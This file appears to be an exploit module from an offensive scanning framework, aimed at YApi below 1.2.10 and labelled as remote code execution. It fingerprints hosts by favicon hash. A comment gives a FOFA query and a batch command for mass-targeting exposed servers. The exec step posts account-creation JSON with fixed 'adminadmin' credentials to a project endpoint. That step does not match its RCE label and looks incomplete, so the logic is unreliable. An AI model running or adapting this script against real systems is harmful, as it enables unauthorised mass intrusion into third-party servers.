# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-30 15:56
import hashlib

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *

# fofa: app="yapi"
# python3 batch.py -m exploit.scripts.Yapi.mock_rce -cs -fs "app=\"yapi\""


class Script(BaseScript):
    name = 'Yapi'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/image/favicon.png']
        # exec
        self.exec_path_list = ['/api/project/get']
        # 相关信息
        self.info = 'Yapi RCE < 1.2.10'
        # favicon
        self.favicon_md5_list = ['9672fea49d0e2d9f30961d485714aa3d', '7f71f801842739bfac60e13acc2e5ddd']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if favicon_md5 in self.favicon_md5_list:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/json'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                email = '{}@qq.com'.format(str(random.randint(10000000, 99999999)))
                data = '{"email":"' + email + '","password":"adminadmin","username":"adminadmin"}'
                text = await AsyncFetcher.post_fetch(session=session, url=url, headers=headers, data=data, timeout=self.req_timeout)
                if text is not None and '"errcode":0' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
